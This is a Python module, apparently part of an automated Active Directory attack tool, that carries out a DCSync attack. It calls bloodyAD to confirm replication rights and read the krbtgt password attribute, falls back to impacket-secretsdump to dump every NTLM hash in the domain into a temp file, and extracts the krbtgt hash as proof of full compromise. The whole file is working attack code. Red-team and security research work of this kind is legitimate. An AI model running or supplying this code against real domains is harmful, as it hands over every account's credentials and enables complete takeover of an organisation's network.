# strategies/dc_sync.py
import subprocess
from entities.edge import Edge
from .exploit_strategy import ExploitStrategy


class DCSyncStrategy(ExploitStrategy):
    """
    DCSync — Réplication de l'annuaire AD.
    Dump tous les hashes NTLM du domaine incluant krbtgt.
    Outil : bloodyAD (ou impacket-secretsdump -just-dc en fallback).
    """
    def can_exploit(self, edge: Edge) -> bool:
        return edge.kind.name in ["DCSYNC", "GET_CHANGES_ALL"]
    def describe(self, edge: Edge) -> str:
        return (
            f"[DCSync] {edge.source_node.label} peut répliquer l'AD "
            f"→ dump de tous les hashes NTLM du domaine"
        )

    def exploit(self, edge: Edge, username: str, password: str, domain: str, dc_ip: str) -> dict:

        # ── Méthode 1 : bloodyAD ─────────────────────────────────────────────
        output_blody = self._try_bloodyad(username, password, domain, dc_ip)
        if output_blody["success"]:
            return output_blody

        # ── Méthode 2 : impacket-secretsdump (fallback) ──────────────────────
        return self._try_secretsdump(username, password, domain, dc_ip)

    # ── Helpers privés ────────────────────────────────────────────────────────

    def _try_bloodyad(self, username: str, password: str, domain: str, dc_ip: str) -> dict:
        cmd = [
            "bloodyAD",
            "--host", dc_ip,
            "-d", domain,
            "-u", username,
            "-p", password,
            "get", "writable",
            "--otype", "USER",
            "--right", "DCSync"
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
            output = result.stdout + result.stderr
            # Si bloodyAD confirme les droits, on lance le dump complet
            if result.returncode == 0:
                return self._dump_all_hashes_bloodyad(username, password, domain, dc_ip)
            return {"success": False, "output": output, "credentials": None}
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return {"success": False, "output": "bloodyAD indisponible", "credentials": None}

    def _dump_all_hashes_bloodyad(self, username: str, password: str, domain: str, dc_ip: str) -> dict:
        cmd = [
            "bloodyAD",
            "--host", dc_ip,
            "-d", domain,
            "-u", username,
            "-p", password,
            "get", "object",
            "krbtgt",
            "--attr", "unicodePwd"
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
            output = result.stdout + result.stderr
            success = result.returncode == 0
            return {
                "success": success,
                "output":  output,
                "credentials": {
                    "type":   "dcsync",
                    "method": "bloodyAD",
                    "output": output,
                } if success else None
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "output": "Timeout", "credentials": None}

    def _try_secretsdump(self, username: str, password: str, domain: str, dc_ip: str) -> dict:
        cmd = [
            "impacket-secretsdump",
            f"{domain}/{username}:{password}@{dc_ip}",
            "-just-dc",                          # mode DCSync uniquement
            "-outputfile", "/tmp/dcsync_dump"
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            output = result.stdout + result.stderr

            hashes = [
                line.strip()
                for line in output.splitlines()
                if ":::" in line and not line.startswith("[")
            ]

            # Cherche spécifiquement krbtgt (preuve de compromission totale)
            krbtgt_hash = next(
                (h for h in hashes if "krbtgt" in h.lower()),
                None
            )

            success = krbtgt_hash is not None

            return {
                "success": success,
                "output":  output,
                "credentials": {
                    "type":        "dcsync",
                    "method":      "secretsdump",
                    "krbtgt_hash": krbtgt_hash,
                    "all_hashes":  hashes,
                } if success else None
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "output": "Timeout", "credentials": None}
        except FileNotFoundError:
            return {"success": False, "output": "impacket-secretsdump introuvable", "credentials": None}